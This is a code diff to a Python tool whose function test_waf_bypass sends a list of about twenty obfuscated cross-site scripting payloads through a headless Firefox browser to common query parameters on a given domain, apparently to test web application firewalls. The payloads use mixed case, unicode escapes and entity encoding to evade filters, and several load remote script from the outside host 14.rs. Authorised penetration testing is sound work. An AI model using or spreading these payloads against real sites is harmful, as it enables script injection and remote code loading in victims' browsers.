@@ -15,7 +15,29 @@ bd = Style.BRIGHT
 res = Style.RESET_ALL
 
 def test_waf_bypass(domain):
-    payloads = ["<script>alert('XSS')</script>", "' OR '1'='1"]
+    payloads = [
+        '\'"</Script><Html Onmouseover=(confirm)()//',
+        '<imG/sRc=l oNerrOr=(prompt)() x>',
+        '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
+        '<deTails open oNToggle=confi\u0072m()>',
+        '<img sRc=l oNerrOr=(confirm)() x>',
+        '<svg/x=">"/onload=confirm()//',
+        '<svg%0Aonload=%09((pro\u006dpt))()//',
+        '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
+        '<sCript x>confirm``</scRipt x>',
+        '<Script x>prompt()</scRiPt x>',
+        '<sCriPt sRc=//14.rs>',
+        '<embed//sRc=//14.rs>',
+        '<base href=//14.rs/><script src=/>',
+        '<object//data=//14.rs>',
+        '<s=" onclick=confirm``>clickme',
+        '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
+        '\'"><y///oNMousEDown=((confirm))()>Click',
+        '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
+        '<img src=x onerror=confir\u006d`1`>',
+        '<svg/onload=co\u006efir\u006d`1`>'
+    ]
+    
     query_params = [
         "test", "id", "name", "search", "q", "query", "item", "category",
         "product", "page", "user", "username", "email", "login", "pass",
@@ -29,9 +51,19 @@ def test_waf_bypass(domain):
         "chapterid"
     ]
 
+    os_type = platform.system()
+    if os_type == "Windows":
+        geckodriver_path = os.path.join(os.path.dirname(__file__), 'geckodriver.exe')
+    elif os_type in ["Linux", "Darwin"]:  # For both Linux and MacOS
+        geckodriver_path = os.path.join(os.path.dirname(__file__), 'geckodriver')
+    else:
+        raise Exception(f"Unsupported OS: {os_type}")
+
+    service = FirefoxService(executable_path=geckodriver_path)
     options = Options()
     options.headless = True
-    driver = webdriver.Firefox(options=options)
+
+    driver = webdriver.Firefox(service=service, options=options)
     
     try:
         for payload in payloads:
